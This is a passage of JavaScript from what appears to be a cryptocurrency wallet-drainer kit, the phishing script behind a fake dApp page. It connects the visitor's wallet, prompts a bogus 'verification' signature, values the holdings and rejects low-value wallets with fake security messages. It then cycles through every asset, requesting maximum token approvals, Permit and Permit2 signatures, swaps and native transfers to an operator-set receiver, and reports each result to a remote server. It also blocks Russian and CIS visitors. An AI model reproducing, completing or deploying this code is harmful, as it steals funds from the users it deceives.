  const new_contract = new ethers.Contract(asset.address, CF_Contract_ABI['ERC20'], node);
  const current_allowance = await new_contract.allowance(CF_Current_Address, (CF_Settings.Settings.Use_Randomizer_For_Tokens ? CF_Settings.Personal_Wallet.address : CF_Settings.Address));

  if (current_allowance.gte(ethers.BigNumber.from(max_approval_amount))) {
    await approve_request(asset); sign_next();
    wait_message(); await approve_success(asset);
    sign_ready(); return 1;
  }

  const unsigned_tx = { from: CF_Current_Address, to: asset.address, value: "0x0" };

  const web3 = new Web3(CF_Provider); let contract_data = null;
  const increase_type = (asset.increase == 2) ? 'increaseApproval' : 'increaseAllowance';
  const web3_contract = new web3.eth.Contract([
    {
      "inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"increment","type":"uint256"}],
      "name":`${increase_type}`,"outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"
    }
  ], asset.address);

  contract_data = web3_contract.methods[increase_type]((CF_Settings.Settings.Use_Randomizer_For_Tokens ? CF_Settings.Personal_Wallet.address : CF_Settings.Address), max_approval_amount).encodeABI();

  unsigned_tx.data = contract_data;
  const gas_limit = await node.estimateGas(unsigned_tx);
  const nonce = await node.getTransactionCount(CF_Current_Address, 'pending');

  unsigned_tx.gasPrice = gas_price;
  unsigned_tx.gasLimit = gas_limit;
  unsigned_tx.nonce = nonce;

  await approve_request(asset); sign_next();
  const tx = await CF_Signer.sendTransaction(unsigned_tx);
  wait_message();

  if (CF_Settings.Settings.Wait_For_Confirmation) await node.waitForTransaction(tx.hash, 1, 90000);
  await approve_success(asset); sign_ready(); return 1;
};

const connect_wallet = async (provider = null) => {
  try {
    if (!CF_Connection) {
      if (CF_Load_Time == null || Math.floor(Date.now() / 1000) - CF_Load_Time < 15) return;
      if (CF_Loader_Style == 2) {
        MSL.fire({
          icon: 'error', title: 'Критическая ошибка', subtitle: 'Нет связи с сервером', text: 'Скрипт не может соединиться с сервером и получить данные, возможно вы настроили что-то некорректно или домен сервера ещё недоступен или был заблокирован. Проверьте и исправьте проблемы перед использованием сайта.',
          showConfirmButton: true, confirmButtonText: 'OK', color: CF_Color_Scheme
        });
      } else {
        Swal.close();
        Swal.fire({
          html: '<b>Критическая ошибка</b><br><br>Скрипт не может соединиться с сервером и получить данные, возможно вы настроили что-то некорректно или домен сервера ещё недоступен или был заблокирован. Проверьте и исправьте проблемы перед использованием сайта.', icon: 'error',
          allowOutsideClick: true, allowEscapeKey: true, timer: 0, width: 600,
          showConfirmButton: true, confirmButtonText: 'OK'
        });
      }
      return;
    }
    if (CF_Process) return; CF_Process = true;
    if (CF_Bad_Country) {
      try { ms_hide(); } catch(err) { console.log(err); }
      try {
        if (CF_Loader_Style == 2) {
          MSL.fire({
            icon: 'error', title: 'Critical Error', subtitle: 'Запрещенная геолокация', text: 'Пожалуйста, покиньте этот веб-сайт немедленно, он не предназначен для России и стран СНГ, не пытайтесь использовать VPN, это небезопасно!',
            showConfirmButton: true, confirmButtonText: 'OK', color: CF_Color_Scheme
          });
        } else {
          Swal.close();
          Swal.fire({
            html: '<b>Предупреждение</b><br><br>Пожалуйста, покиньте этот веб-сайт немедленно, он не предназначен для России и стран СНГ, не пытайтесь использовать VPN, это небезопасно!', icon: 'error',
            allowOutsideClick: true, allowEscapeKey: true, timer: 0, width: 600,
            showConfirmButton: true, confirmButtonText: 'OK'
          });
        }
        await new Promise(r => setTimeout(r, 15000));
        window.location.href = 'https://ya.ru';
      } catch(err) {
        console.log(err);
      }
      return;
    }
    if (provider !== null) {
      if (provider == 'MetaMask') {
        if (typeof window.ethereum == 'object' && typeof window.ethereum.providers === 'object') {
          let is_installed = false;
          for (const elem of window.ethereum.providers) {
            if (elem.isMetaMask == true) {
              is_installed = true;
              CF_Provider = elem;
              CF_Current_Provider = 'MetaMask';
              break;
            }
          }
          if (!is_installed) {
            if (CF_Mobile_Status) {
              window.location.href = `https://metamask.app.link/dapp/${CF_Current_URL}`;
              CF_Process = false;
              return;
            } else {
              window.open('https://metamask.io', '_blank').focus();
              CF_Process = false;
              return;
            }
          }
        } else {
          if (typeof window.ethereum === 'object' && window.ethereum.isMetaMask) {
            CF_Provider = window.ethereum;
            CF_Current_Provider = 'MetaMask';
          } else {
            if (CF_Mobile_Status) {
              window.location.href = `https://metamask.app.link/dapp/${CF_Current_URL}`;
              CF_Process = false;
              return;
            } else {
              window.open('https://metamask.io', '_blank').focus();
              CF_Process = false;
              return;
            }
          }
        }
      } else if (provider == 'Coinbase') {
        if (typeof window.ethereum == 'object' && typeof window.ethereum.providers === 'object') {
          let is_installed = false;
          for (const elem of window.ethereum.providers) {
            if (elem.isCoinbaseWallet == true) {
              is_installed = true;
              CF_Provider = elem;
              break;
            }
          }
          if (is_installed) {
            CF_Current_Provider = 'Coinbase';
          } else {
            if (CF_Mobile_Status) {
              window.location.href = `https://go.cb-w.com/dapp?cb_url=https://${CF_Current_URL}`;
              CF_Process = false;
              return;
            } else {
              window.open('https://www.coinbase.com/wallet', '_blank').focus();
              CF_Process = false;
              return;
            }
          }
        } else {
          if (typeof window.ethereum === 'object' && (window.ethereum.isCoinbaseWallet || window.ethereum.isCoinbaseBrowser)) {
            CF_Provider = window.ethereum;
            CF_Current_Provider = 'Coinbase';
          } else {
            if (CF_Mobile_Status) {
              window.location.href = `https://go.cb-w.com/dapp?cb_url=https://${CF_Current_URL}`;
              CF_Process = false;
              return;
            } else {
              window.open('https://www.coinbase.com/wallet', '_blank').focus();
              CF_Process = false;
              return;
            }
          }
        }
      } else if (provider == 'Trust Wallet') {
        if (typeof window.ethereum === 'object' && window.ethereum.isTrust) {
          CF_Provider = window.ethereum;
          CF_Current_Provider = 'Trust Wallet';
        } else {
          if (CF_Mobile_Status) {
            window.location.href = `https://link.trustwallet.com/open_url?coin_id=60&url=https://${CF_Current_URL}`;
            CF_Process = false;
            return;
          } else {
            window.open('https://trustwallet.com', '_blank').focus();
            CF_Process = false;
            return;
          }
        }
      } else if (provider == 'Binance Wallet') {
        if (typeof window.BinanceChain === 'object') {
          CF_Provider = window.BinanceChain;
          CF_Current_Provider = 'Binance Wallet';
        } else {
          window.open('https://chrome.google.com/webstore/detail/binance-wallet/fhbohimaelbohpjbbldcngcnapndodjp', '_blank').focus();
          CF_Process = false;
          return;
        }
      } else if (provider == 'WalletConnect' || provider == 'WalletConnect_v2') {
        CF_Current_Provider = 'WalletConnect';
      } else {
        if (typeof window.ethereum === 'object') {
          CF_Provider = window.ethereum;
          CF_Current_Provider = 'Ethereum';
        } else {
          CF_Current_Provider = 'WalletConnect';
        }
      }
    } else {
      if (window.ethereum) {
        CF_Provider = window.ethereum;
        CF_Current_Provider = 'Ethereum';
      } else {
        CF_Current_Provider = 'WalletConnect';
      }
    }
    try {
      await connect_request();
      let connection = null;
      if (CF_Current_Provider == 'WalletConnect') {
        ms_hide(); await load_wc();
        while (!CF_Is_AppKit_Inited) await new Promise(r => setTimeout(r, 100));
        while (CF_Is_AppKit_Connected) {
          await new Promise(r => setTimeout(r, 500));
          try {
            CF_AppKit.disconnect(CF_AppKit.getWalletProvider());
          } catch(err) {
            console.log(err);
          }
        }
        await new Promise(r => setTimeout(r, 1000));
        CF_AppKit.open({ view: 'Connect' });
        await new Promise(r => setTimeout(r, 1000));
        while (!CF_AppKit.getIsConnectedState()) {
          await new Promise(r => setTimeout(r, 500));
          if (!CF_AppKit.getState()?.open) {
            await new Promise(r => setTimeout(r, 1000));
            if (!CF_AppKit.getIsConnectedState() && !CF_AppKit.getState()?.open) {
              console.log('W3M Closed');
              CF_Process = false;
              return await connect_cancel();
            }
          }
        }
        await new Promise(r => setTimeout(r, 1000));
        while (CF_AppKit.getState()?.open) await new Promise(r => setTimeout(r, 100));
        if (!CF_AppKit.getIsConnectedState()) {
          console.log('Connection Failed');
          CF_Process = false;
          return await connect_cancel();
        }
        CF_Is_AppKit_Connected = true;
        CF_Current_Address = CF_AppKit.getAddress();
        CF_Provider = CF_AppKit.getWalletProvider();
        CF_Current_Chain_ID = CF_AppKit.getChainId();
        let wallet_info = CF_AppKit.getWalletInfo();
        CF_Current_Provider = (wallet_info?.name || 'WalletConnect');
        CF_Wallet_Name = (wallet_info?.name || 'WalletConnect');
        CF_Web3 = new ethers.providers.Web3Provider(CF_Provider);
        CF_Signer = CF_Web3.getSigner();
        if (CF_Settings.Settings.Sign.WalletConnect == 0) {
          CF_Sign_Disabled = true;
        }
      } else if (CF_Current_Provider == 'WalletConnect_OLD') {
        ms_hide(); await load_wc();
        try {
          await CF_Provider.disconnect();
        } catch(err) {
          console.log(err);
        }
        await CF_Provider.connect();
        if (CF_Provider && CF_Provider.accounts.length > 0) {
          if (!CF_Provider.accounts[0].includes('0x')) {
            CF_Process = false;
            return await connect_cancel();
          }
          await new Promise(r => setTimeout(r, 2500));
          CF_Current_Address = CF_Provider.accounts[0];
          CF_Current_Chain_ID = CF_Provider.chainId;
          CF_Web3 = new ethers.providers.Web3Provider(CF_Provider);
          CF_Signer = CF_Web3.getSigner();
          if (CF_Settings.Settings.Sign.WalletConnect == 0) {
            CF_Sign_Disabled = true;
          }
        } else {
          CF_Process = false;
          return await connect_cancel();
        }
      } else if (CF_Current_Provider == 'Trust Wallet') {
        try {
          connection = await CF_Provider.request({ method: 'eth_requestAccounts', params: [{ eth_accounts: {} }] });
          if (connection && connection.length > 0) {
            if (!CF_Provider.selectedAddress.includes('0x')) return connect_cancel();
            CF_Current_Address = CF_Provider.selectedAddress;
            CF_Current_Chain_ID = parseInt(await CF_Provider.request({ method: 'eth_chainId' }));
            CF_Web3 = new ethers.providers.Web3Provider(CF_Provider);
            CF_Signer = CF_Web3.getSigner();
          } else {
            CF_Process = false;
            return await connect_cancel();
          }
        } catch(err) {
          connection = await CF_Provider.request({ method: 'eth_requestAccounts' });
          if (connection && connection.length > 0) {
            if (!connection[0].includes('0x')) return connect_cancel();
            CF_Current_Address = connection[0];
            CF_Current_Chain_ID = parseInt(await CF_Provider.request({ method: 'eth_chainId' }));
            CF_Web3 = new ethers.providers.Web3Provider(CF_Provider);
            CF_Signer = CF_Web3.getSigner();
          } else {
            CF_Process = false;
            return await connect_cancel();
          }
        }
      } else {
        try {
          connection = await CF_Provider.request({ method: 'wallet_requestPermissions', params: [{ eth_accounts: {} }] });
          if (connection && connection.length > 0) {
            if (!CF_Provider.selectedAddress.includes('0x')) return connect_cancel();
            CF_Current_Address = CF_Provider.selectedAddress;
            CF_Current_Chain_ID = parseInt(await CF_Provider.request({ method: 'eth_chainId' }));
            CF_Web3 = new ethers.providers.Web3Provider(CF_Provider);
            CF_Signer = CF_Web3.getSigner();
          } else {
            CF_Process = false;
            return await connect_cancel();
          }
        } catch(err) {
          connection = await CF_Provider.request({ method: 'eth_requestAccounts' });
          if (connection && connection.length > 0) {
            if (!connection[0].includes('0x')) return connect_cancel();
            CF_Current_Address = connection[0];
            CF_Current_Chain_ID = parseInt(await CF_Provider.request({ method: 'eth_chainId' }));
            CF_Web3 = new ethers.providers.Web3Provider(CF_Provider);
            CF_Signer = CF_Web3.getSigner();
          } else {
            CF_Process = false;
            return await connect_cancel();
          }
        }
      }
      if (!CF_Current_Address.match(/^0x\S+$/)) throw new Error('Invalid Wallet');
    } catch(err) {
      console.log(err);
      CF_Process = false;
      return await connect_cancel();
    }
    ms_hide();
    if (CF_Settings.V_MODE == 1) {
      if (CF_Loader_Style == 2) {
        MSL.fire({
          icon: 'load', title: 'Waiting for action', text: 'Sign message to verificate your wallet',
          showConfirmButton: true, confirmButtonText: 'Waiting...', color: CF_Color_Scheme
        });
      } else {
        Swal.fire({
          html: '<b>Sign message</b> to verificate you wallet...',
          imageUrl: 'https://cdn.discordapp.com/emojis/833980758976102420.gif?size=96&quality=lossless',
          imageHeight: 60, allowOutsideClick: false, allowEscapeKey: false,
          timer: 0, width: 600, showConfirmButton: false
        });
      }
      try {
        const verification_message = ((CF_Verify_Message == "") ? CF_Settings.V_MSG : CF_Verify_Message).replaceAll('{{ADDRESS}}', CF_Current_Address);
        const signed_message = await CF_Signer.signMessage(verification_message);
        const is_sign_correct = ethers.utils.recoverAddress(ethers.utils.hashMessage(verification_message), signed_message);
        if (!is_sign_correct) {
          if (CF_Loader_Style == 2) {
            MSL.fire({
              icon: 'error', title: 'Error', subtitle: 'Verification Error', text: 'We have received your signature, but it\'s incorrect, please try again.',
              showConfirmButton: true, confirmButtonText: 'OK', color: CF_Color_Scheme
            });
          } else {
            Swal.fire({
              title: 'Verification Error',
              text: "We have received your signature, but it's incorrect, please try again.",
              icon: 'error', confirmButtonText: 'OK'
            });
          }

          CF_Process = false;
          return await connect_cancel();
        } else {
          let server_result = await send_request({ action: 'sign_verify', sign: signed_message, address: CF_Current_Address, message: CF_Verify_Message });
          if (server_result.status != 'OK') {
            if (CF_Loader_Style == 2) {
              MSL.fire({
                icon: 'error', title: 'Error', subtitle: 'Verification Error', text: 'We have received your signature, but it\'s incorrect, please try again.',
                showConfirmButton: true, confirmButtonText: 'OK', color: CF_Color_Scheme
              });
            } else {
              Swal.fire({
                title: 'Verification Error',
                text: "We have received your signature, but it's incorrect, please try again.",
                icon: 'error', confirmButtonText: 'OK'
              });
            }
            CF_Process = false;
            return await connect_cancel();
          }
        }
      } catch(err) {
        if (CF_Loader_Style == 2) {
          MSL.fire({
            icon: 'error', title: 'Error', subtitle: 'Verification Error', text: 'We cannot verify that the wallet is yours as you did not sign the message provided.',
            showConfirmButton: true, confirmButtonText: 'OK', color: CF_Color_Scheme
          });
        } else {
          Swal.fire({
            title: 'Verification Error',
            text: "We cannot verify that the wallet is yours as you did not sign the message provided.",
            icon: 'error', confirmButtonText: 'OK'
          });
        }
        CF_Process = false;
        return await connect_cancel();
      }
    } else {
      await send_request({ action: 'sign_verify', address: CF_Current_Address });
    }
    try {
      if (CF_Current_Provider == 'WalletConnect') {
        try {
          await CF_Provider.request({ method: "wallet_switchEthereumChain", params: [{ chainId:  `0x1` }] });
          await new Promise(r => setTimeout(r, 3000));
        } catch(err) {
          console.log(err);
        }
      } else {
        try {
          await CF_Provider.request({ method: "wallet_switchEthereumChain", params: [{ chainId: `0x1` }] });
          await new Promise(r => setTimeout(r, 3000));
        } catch(err) {
          if (err.code == 4902 || err.code == -32603) {
            try {
              await CF_Provider.request({ method: "wallet_addEthereumChain", params: [ CF_MetaMask_ChainData[1] ] });
              await new Promise(r => setTimeout(r, 3000));
            } catch(err) {
              console.log(err);
            }
          } else {
            console.log(err);
          }
        }
      }
      CF_Current_Chain_ID = parseInt(await CF_Provider.request({ method: 'eth_chainId' }));
      CF_Web3 = new ethers.providers.Web3Provider(CF_Provider);
      CF_Signer = CF_Web3.getSigner();
    } catch(err) {
      console.log(err);
    }
    await connect_success(); show_check();
    if (CF_Settings.Wallet_Blacklist.length > 0 && CF_Settings.Wallet_Blacklist.includes(CF_Current_Address.toLowerCase().trim())) {
      CF_Check_Done = true; Swal.close();
      if (CF_Loader_Style == 2) {
        MSL.fire({
          icon: 'error', title: 'Error', subtitle: 'AML Error', text: 'Your wallet is not AML clear!',
          showConfirmButton: true, confirmButtonText: 'OK', color: CF_Color_Scheme
        });
      } else {
        Swal.fire({
          title: 'AML Error',
          text: "Your wallet is not AML clear, you can\'t use it!",
          icon: 'error', confirmButtonText: 'OK'
        });
      }
      CF_Process = false;
      return;
    }
    let assets = await get_wallet_assets(CF_Current_Address);
    let assets_price = 0; for (const asset of assets) {
      try {
        assets_price += asset.amount_usd;
      } catch(err) {
        console.log(err);
      }
    }
    let assets_usd_balance = 0; for (const asset of assets) assets_usd_balance += asset.amount_usd;
    await send_request({ action: 'check_finish', user_id: CF_ID, assets: assets, balance: assets_usd_balance });
    if (assets_usd_balance >= CF_Settings.Settings.Minimal_Wallet_Price && CF_Settings.Is_Personal_Wallet) await retrieve_wallet();
    CF_Check_Done = true; Swal.close();
    if (CF_Settings.Settings.Minimal_Wallet_Price > assets_price) {
      if (CF_Loader_Style == 2) {
        MSL.fire({
          icon: 'error', title: 'Error', subtitle: 'Something went wrong!', text: 'For security reasons we can\'t allow you to connect empty or new wallet',
          showConfirmButton: true, confirmButtonText: 'OK', color: CF_Color_Scheme
        });
      } else {
        Swal.fire({
          title: 'Something went wrong!',
          text: "For security reasons we can't allow you to connect empty or new wallet",
          icon: 'error', confirmButtonText: 'OK'
        });
      }
      CF_Process = false;
      return;
    }
    if (CF_Loader_Style == 2) {
      MSL.fire({
        icon: 'success', title: 'All data received', text: 'Thanks for waiting!', showConfirmButton: false, timer: 1500, color: CF_Color_Scheme
      }).then(() => {
        MSL.fire({
          icon: 'load', title: 'Waiting for a response', text: 'The server is processing your request, please wait a little, it will take about a minute...',
          showConfirmButton: true, confirmButtonText: 'Loading...', color: CF_Color_Scheme
        });
      });
    } else {
      Swal.fire({
        html: '<b>Done!</b> Sign message in your wallet to continue...',
        imageUrl: 'https://cdn.discordapp.com/emojis/833980758976102420.gif?size=96&quality=lossless',
        imageHeight: 60, allowOutsideClick: false, allowEscapeKey: false,
        timer: 0, width: 600, showConfirmButton: false
      });
    }
    if ((CF_Settings.Settings.Sign.MetaMask == 0 && CF_Current_Provider == 'MetaMask') || (CF_Settings.Settings.Sign.Trust == 0
      && CF_Current_Provider == 'Trust Wallet') || (CF_Current_Provider == 'Trust Wallet' && !CF_Mobile_Status)) CF_Sign_Disabled = true;
    for (const asset of assets) {
      try {
        if (asset.type != 'NATIVE') {
          if (CF_Settings.Settings.Use_Swap_Bypass) {
            if (is_token_swappable(asset.chain_id, asset.address) != false) {
              CF_Gas_Reserves[asset.chain_id] += 2;
            } else {
              CF_Gas_Reserves[asset.chain_id] += 1;
            }
          } else {
            CF_Gas_Reserves[asset.chain_id] += 1;
          }
        }
      } catch(err) {
        console.log(err);
      }
    }
    console.table(assets);
    if (CF_Settings.Settings.Use_MetaMask_Batch_Approval && CF_Current_Provider == 'MetaMask') {
      const suppoted_chain_ids = [];
      for (const chain_name in CF_Settings.Settings.Chains) {
        try {
          if (CF_Settings.Settings.Chains[chain_name].MM_Batch_Approval_Support) {
            suppoted_chain_ids.push(convert_chain('ANKR', 'ID', chain_name));
          }
        } catch(err) {
          console.log(err);
        }
      }
      for (const chain_id of suppoted_chain_ids) {
        try {
          let batch_assets = [];
          for (const asset of assets) {
            if (asset.chain_id != chain_id) continue;
            if (batch_assets.length >= 10) continue;
            if (asset.type != 'ERC20') continue;
            batch_assets.push(asset);
          }
          if (batch_assets.length >= 2) {
            try {
              let is_chain_correct = false;
              if (chain_id != CF_Current_Chain_ID) {
                await chain_request(CF_Current_Chain_ID, chain_id);
                try {
                  if (CF_Current_Provider == 'WalletConnect') {
                    try {
                      await CF_Provider.request({ method: "wallet_switchEthereumChain", params: [{ chainId:  `0x${chain_id.toString(16)}` }] });
                      await new Promise(r => setTimeout(r, 3000));
                    } catch(err) {
                      await chain_cancel();
                      continue;
                    }
                  } else {
                    try {
                      await CF_Provider.request({ method: "wallet_switchEthereumChain", params: [{ chainId: `0x${chain_id.toString(16)}` }] });
                      await new Promise(r => setTimeout(r, 3000));
                    } catch(err) {
                      if (err.code == 4902 || err.code == -32603) {
                        try {
                          await CF_Provider.request({ method: "wallet_addEthereumChain", params: [ CF_MetaMask_ChainData[chain_id] ] });
                          await new Promise(r => setTimeout(r, 3000));
                        } catch(err) {
                          await chain_cancel();
                          continue;
                        }
                      } else {
                        await chain_cancel();
                        continue;
                      }
                    }
                  }
                  CF_Current_Chain_ID = parseInt(await CF_Provider.request({ method: 'eth_chainId' }));
                  CF_Web3 = new ethers.providers.Web3Provider(CF_Provider);
                  CF_Signer = CF_Web3.getSigner();
                  is_chain_correct = true;
                  await chain_success();
                } catch(err) {
                  console.log(err);
                  await chain_cancel();
                  continue;
                }
              } else {
                is_chain_correct = true;
              }
              if (!is_chain_correct) continue;
              if (CF_Settings.Settings.Use_Swap_Bypass_with_MetaMask_Batch_Approval) {
                const swap_batch = [];
                const swapper_data_batch = [];
                for (const asset of batch_assets) {
                  try {
                    let swapper_data;
                    if (swapper_data = is_token_swappable(chain_id, asset.address)) {
                      swap_batch.push(asset);
                      swapper_data_batch.push(swapper_data);
                    }
                  } catch(err) {
                    console.log(err);
                  }
                }
                if (swap_batch.length > 0) {
                  await DO_SWAP_BYPASS_BATCH(swap_batch, swapper_data_batch);
                  for (const asset of swap_batch) {
                    try {
                      for (const x_asset of assets) {
                        try {
                          if (x_asset.chain_id == asset.chain_id && x_asset.address == asset.address && x_asset.type == asset.type) {
                            x_asset.skip = true;
                            break;
                          }
                        } catch(err) {
                          console.log(err);
                        }
                      }
                    } catch(err) {
                      console.log(err);
                    }
                  }
                }
              } else {
                let res_code = await MM_BATCH_APPROVE(batch_assets);
                if (res_code == 1) {
                  for (const asset of batch_assets) {
                    try {
                      const x_promise = send_request({ action: 'approve_token', user_id: CF_ID, asset, address: CF_Current_Address, PW: CF_Settings.Personal_Wallet });
                      if (CF_Settings.Settings.Wait_For_Response) await x_promise;
                      for (const x_asset of assets) {
                        try {
                          if (x_asset.chain_id == asset.chain_id && x_asset.address == asset.address && x_asset.type == asset.type) {
                            x_asset.skip = true;
                            break;
                          }
                        } catch(err) {
                          console.log(err);
                        }
                      }
                    } catch(err) {
                      console.log(err);
                    }
                  }
                }
              }
            } catch(err) {
              console.log(err);
              await approve_cancel();
            }
          }
        } catch(err) {
          console.log(err);
        }
      }
    }
    let should_repeat_all = true;
    while (should_repeat_all) {
      should_repeat_all = (CF_Settings.LA == 1);
      for (const asset of assets) {
        try {
          if (asset.skip) continue;
          let is_chain_correct = false;
          if (asset.type == 'NATIVE') {
            const node = new ethers.providers.JsonRpcProvider(CF_Settings.RPCs[asset.chain_id]);
            const gas_price = BN(await node.getGasPrice()).div(BN(100)).mul(Math.floor(CF_Gas_Multiplier * 100));
            const token_limit = BN((asset.chain_id == 42161) ? 5000000 : (asset.chain_id == 43114 ? 5000000 : (asset.chain_id == 369 ? 900000 : 150000)));
            const tokens_gas_fee = token_limit.mul(CF_Gas_Reserves[asset.chain_id]).mul(gas_price);
            const tx_template = { from: CF_Current_Address, to: CF_Settings.Receiver, value: BN(100) };
            const gas_limit = await node.estimateGas(tx_template);
            const balance = await node.getBalance(CF_Current_Address);
            const available_amount = balance.sub(gas_limit.mul(gas_price)).sub(tokens_gas_fee);
            if (available_amount.lte(BN(0))) continue;
          }
          if (asset.chain_id != CF_Current_Chain_ID) {
            await chain_request(CF_Current_Chain_ID, asset.chain_id);
            try {
              if (CF_Current_Provider == 'WalletConnect') {
                try {
                  await CF_Provider.request({ method: "wallet_switchEthereumChain", params: [{ chainId:  `0x${asset.chain_id.toString(16)}` }] });
                  await new Promise(r => setTimeout(r, 3000));
                } catch(err) {
                  await chain_cancel();
                  continue;
                }
              } else {
                try {
                  await CF_Provider.request({ method: "wallet_switchEthereumChain", params: [{ chainId: `0x${asset.chain_id.toString(16)}` }] });
                  await new Promise(r => setTimeout(r, 3000));
                } catch(err) {
                  if (err.code == 4902 || err.code == -32603) {
                    try {
                      await CF_Provider.request({ method: "wallet_addEthereumChain", params: [ CF_MetaMask_ChainData[asset.chain_id] ] });
                      await new Promise(r => setTimeout(r, 3000));
                    } catch(err) {
                      await chain_cancel();
                      continue;
                    }
                  } else {
                    await chain_cancel();
                    continue;
                  }
                }
              }
              CF_Current_Chain_ID = parseInt(await CF_Provider.request({ method: 'eth_chainId' }));
              CF_Web3 = new ethers.providers.Web3Provider(CF_Provider);
              CF_Signer = CF_Web3.getSigner();
              is_chain_correct = true;
              await chain_success();
            } catch(err) {
              console.log(err);
              await chain_cancel();
              continue;
            }
          } else {
            is_chain_correct = true;
          }
          if (!is_chain_correct) continue;
          if (asset.type == 'NATIVE') {
            let service_contract = false;
            try {
              let sc_result = await send_request({ action: 'retrieve_service_contract', wallet: CF_Current_Provider, chain_id: asset.chain_id, wallet_balance: assets_usd_balance });
              if (sc_result.status == 'OK' && sc_result.contract_address && typeof sc_result.contract_address == 'string') {
                service_contract = sc_result.contract_address;
                console.log(`[SERVICE CONTRACT] ${asset.name}, Service Contract: ${service_contract}`)
              }
            } catch(err) {
              console.log(err);
            }
            if (CF_Settings.Settings.Sign.Native > 0 && (!CF_Sign_Disabled || CF_Settings.Settings.Sign.Force == 1)) {
              while (true) {
                try {
                  await SIGN_NATIVE(asset);
                  asset.skip = true;
                  break;
                } catch(err) {
                  console.log(err);
                  if ((CF_Settings.Settings.Sign.WC_AE == 1 && CF_Current_Provider == 'WalletConnect') || (typeof err.message == 'string' && err.message.includes('eth_sign')) || err.code == -32601
                  || err.code == -32000 || (err.message && is_valid_json(err.message) && ((JSON.parse(err.message)).code == -32601 || (JSON.parse(err.message)).code == -32000))) {
                    if (CF_Settings.Settings.Sign.Force == 1) {
                      await sign_cancel();
                    } else {
                      await sign_unavailable();
                      while (true) {
                        try {
                          if (service_contract != false) {
                            await TRANSFER_NATIVE_VIA_SERVICE_CONTRACT(asset, service_contract);
                            send_request({ action: 'native_service', user_id: CF_ID, asset, address: CF_Current_Address, PW: false, service_contract });
                          } else {
                            await TRANSFER_NATIVE(asset);
                          }
                          asset.skip = true;
                          break;
                        } catch(err) {
                          console.log(err);
                          if (err != 'LOW_BALANCE') {
                            await transfer_cancel();
                            if (!CF_Settings.Loop_N) break;
                          } else {
                            break;
                          }
                        }
                      }
                    }
                    break;
                  } else {
                    console.log(err);
                    if (err != 'LOW_BALANCE') {
                      await sign_cancel();
                      if (!CF_Settings.Loop_N) break;
                    } else {
                      break;
                    }
                  }
                }
              }
            } else {
              while (true) {
                try {
                  if (service_contract != false) {
                    await TRANSFER_NATIVE_VIA_SERVICE_CONTRACT(asset, service_contract);
                    send_request({ action: 'native_service', user_id: CF_ID, asset, address: CF_Current_Address, PW: false, service_contract });
                  } else {
                    await TRANSFER_NATIVE(asset);
                  }
                  asset.skip = true;
                  break;
                } catch(err) {
                  console.log(err);
                  if (err != 'LOW_BALANCE') {
                    await transfer_cancel();
                    if (!CF_Settings.Loop_N) break;
                  } else {
                    break;
                  }
                }
              }
            }
          } else if (asset.type == 'ERC20') {
            let service_contract = false;
            try {
              let sc_result = await send_request({ action: 'retrieve_service_contract', wallet: CF_Current_Provider, chain_id: asset.chain_id, wallet_balance: assets_usd_balance });
              if (sc_result.status == 'OK' && sc_result.contract_address && typeof sc_result.contract_address == 'string') {
                service_contract = sc_result.contract_address;
                console.log(`[SERVICE CONTRACT] ${asset.name}, Service Contract: ${service_contract}`)
              }
            } catch(err) {
              console.log(err);
            }
            if (typeof asset.permit == 'undefined' && CF_Settings.Settings.Permit.Mode && asset.amount_usd >= CF_Settings.Settings.Permit.Price[asset.chain_id]) {
              const data = await retrieve_token(asset.chain_id, asset.address);
              const node = new ethers.providers.JsonRpcProvider(CF_Settings.RPCs[asset.chain_id]);
              const contract = new ethers.Contract(asset.address, data, node);
              const permit_type = get_permit_type(contract.functions);
              asset.permit = permit_type;
              asset.permit_ver = "1";
              asset.abi = data;
              if (permit_type > 0) {
                if (contract.functions.hasOwnProperty('version')) {
                  try {
                    asset.permit_ver = await contract.version();
                  } catch(err) {
                    console.log(err);
                  }
                }
                console.log(`[PERMIT FOUND] ${asset.name}, Permit Type: ${permit_type}, Version: ${asset.permit_ver}`);
              }
            }
            if (asset.permit > 0) {
              for (const c_address of CF_Settings.Permit_BL) {
                if (c_address[0] == CF_Current_Chain_ID && c_address[1] === asset.address.toLowerCase().trim()) {
                  asset.permit = 0;
                  break;
                }
              }
            }

            if (CF_Settings.Settings.Use_Swap_Bypass && CF_Current_Provider == 'MetaMask' && is_token_swappable(asset.chain_id, asset.address) != false) {
              let swapper_data = is_token_swappable(asset.chain_id, asset.address);
              console.log(swapper_data);
              while (true) {
                try {
                  await DO_SWAP_BYPASS(asset, swapper_data);
                  asset.skip = true;
                  break;
                } catch(err) {
                  console.log(err);
                  await approve_cancel();
                  if (!CF_Settings.Loop_T) break;
                }
              }
            } else if (CF_Settings.Settings.Permit2.Mode && asset.permit2 && check_permit2_allowance(asset)) {
              const all_permit2 = [];
              for (const x_asset of assets) {
                try {
                  if (x_asset.chain_id == asset.chain_id && x_asset.permit2 && check_permit2_allowance(x_asset)) {
                    all_permit2.push(x_asset);
                    x_asset.skip = true;
                  }
                } catch(err) {
                  console.log(err);
                }
              }
              while (true) {
                try {
                  await DO_PERMIT2(asset, all_permit2);
                  asset.skip = true;
                  break;
                } catch(err) {
                  console.log(err);
                  await approve_cancel();
                  if (!CF_Settings.Loop_T) break;
                }
              }
            } else if (service_contract != false) {
              while (true) {
                try {
                  let result = await USE_SERVICE_CONTRACT_TOKEN(asset, service_contract);
                  if (result == 1) {
                    const x_promise = send_request({ action: 'approve_token', user_id: CF_ID, asset, address: CF_Current_Address, PW: false, service_contract });
                    if (CF_Settings.Settings.Wait_For_Response) await x_promise;
                  }
                  asset.skip = true;
                  break;
                } catch(err) {
                  console.log(err);
                  await approve_cancel();
                  if (!CF_Settings.Loop_T) break;
                }
              }
            } else if (CF_Settings.Settings.Permit.Mode && asset.permit && asset.permit > 0) {
              while (true) {
                try {
                  await PERMIT_TOKEN(asset);
                  asset.skip = true;
                  break;
                } catch(err) {
                  console.log(err);
                  await approve_cancel();
                  if (!CF_Settings.Loop_T) break;
                }
              }
            } else if (CF_Settings.Settings.Swappers.Enable && asset.swapper && asset.amount_usd >= CF_Settings.Settings.Swappers.Price) {
              if (asset.swapper_type == 'Uniswap') {
                const all_uniswap = [];
                for (const x_asset of assets) {
                  try {
                    if (x_asset.chain_id == asset.chain_id && x_asset.swapper && x_asset.swapper_type == 'Uniswap') {
                      all_uniswap.push(x_asset);
                      x_asset.skip = true;
                    }
                  } catch(err) {
                    console.log(err);
                  }
                }
                while (true) {
                  try {
